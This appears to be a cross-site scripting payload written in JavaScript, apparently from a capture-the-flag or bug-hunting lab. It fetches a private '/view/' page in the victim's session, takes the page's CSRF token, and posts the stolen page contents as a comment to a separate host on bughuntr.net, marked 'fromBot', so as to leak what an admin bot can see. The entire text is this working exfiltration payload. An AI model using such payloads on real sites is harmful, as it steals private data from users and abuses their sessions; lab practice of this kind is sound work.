fetch("/view/1ae3783c-3ca2-4c4f-8d23-70507dfcca93").then((res) => {
	return res.text();
}).then(data => {
	var csrf = document.getElementsByTagName("input")[0].value;
	var formData = new FormData();

	formData.append("csrfmiddlewaretoken", csrf);
	formData.append("creator", "fromBot");
	formData.append("body", data);

	fetch("https://hackedabacus.br2.bughuntr.net/comment/99760eaf-4592-4bc0-a1f5-a264fc4644ef",{
		method: 'POST',
		body: formData
	});

})
